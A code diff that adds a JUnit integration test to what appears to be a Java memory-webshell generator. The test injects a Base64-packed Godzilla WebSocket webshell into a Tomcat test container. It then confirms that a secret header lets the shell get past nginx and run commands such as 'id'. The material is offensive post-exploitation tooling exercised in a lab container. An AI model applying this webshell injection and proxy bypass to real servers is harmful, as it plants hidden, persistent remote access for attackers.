@@ -1,12 +1,14 @@
 package com.reajason.javaweb.integration.memshell.tomcat;
 
 import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
+import com.reajason.javaweb.godzilla.GodzillaManager;
 import com.reajason.javaweb.integration.ShellAssertion;
 import com.reajason.javaweb.memshell.MemShellResult;
 import com.reajason.javaweb.memshell.ServerType;
 import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.CommandConfig;
+import com.reajason.javaweb.memshell.config.GodzillaConfig;
 import com.reajason.javaweb.memshell.config.ShellToolConfig;
 import com.reajason.javaweb.packer.Packers;
 import lombok.extern.slf4j.Slf4j;
@@ -20,6 +22,7 @@ import org.testcontainers.junit.jupiter.Container;
 import org.testcontainers.junit.jupiter.Testcontainers;
 
 import java.io.File;
+import java.io.IOException;
 
 import static org.junit.jupiter.api.Assertions.assertThrows;
 import static org.junit.jupiter.api.Assertions.assertTrue;
@@ -61,6 +64,43 @@ public class Tomcat10WebSocketBypassNginxTest {
         // connect by valve bypass will success
         String response = BlockingJavaWebSocketClient.sendRequestWaitResponseWithHeader(shellUrl, "id", commandConfig.getHeaderName(), commandConfig.getHeaderValue());
         assertTrue(response.contains("uid="));
+    }
+
+
+    @Test
+    public void testGodzillaWs() {
+        String url = getUrl();
+        String server = ServerType.TOMCAT;
+        String serverVersion = "Unknown";
+        int targetJdkVersion = Opcodes.V1_8;
+        String shellType = ShellType.JAKARTA_BYPASS_NGINX_WEBSOCKET;
+        String shellTool = ShellTool.Godzilla;
+        Packers packer = Packers.Base64;
+        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
+        String shellUrl = urls.getLeft();
+        String urlPattern = urls.getRight();
+        ShellToolConfig shellToolConfig = ShellAssertion.getShellToolConfig(shellType, shellTool, packer);
+        MemShellResult generateResult = ShellAssertion.generate(urlPattern, server, serverVersion, shellType, shellTool, targetJdkVersion, shellToolConfig, packer);
+        ShellAssertion.packerResultAndInject(generateResult, url, shellTool, shellType, packer, null);
+        GodzillaConfig godzillaConfig = (GodzillaConfig) generateResult.getShellToolConfig();
+        // direct connect ws will cause failed
+        assertThrows(IllegalStateException.class, () -> {
+            try (GodzillaManager godzillaManager = GodzillaManager.builder()
+                    .entrypoint(shellUrl).pass(godzillaConfig.getPass())
+                    .key(godzillaConfig.getKey()).build()) {
+                godzillaManager.start();
+            }
+        }, "WebSocket connection is not open.");
+        // connect by valve bypass will success
+        try (GodzillaManager godzillaManager = GodzillaManager.builder()
+                .entrypoint(shellUrl).pass(godzillaConfig.getPass())
+                .key(godzillaConfig.getKey()).header(godzillaConfig.getHeaderName()
+                        , godzillaConfig.getHeaderValue()).build()) {
+            assertTrue(godzillaManager.start());
+            assertTrue(godzillaManager.test());
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
     }
 
     public static String getUrl() {
